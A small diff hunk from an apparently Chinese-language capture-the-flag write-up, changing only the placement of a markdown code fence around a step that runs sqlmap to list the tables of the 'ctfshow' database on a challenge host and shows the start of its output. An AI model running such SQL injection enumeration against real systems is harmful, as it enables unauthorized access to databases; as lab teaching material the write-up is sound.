@@ -54,8 +54,9 @@ available databases [7]:
 * 接下来可以查看指定库的所有表：sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id=" -D ctfshow --tables
 
 * 得到回显
-````
 
+
+````
 Database: ctfshow
 [1 table]
 +------+
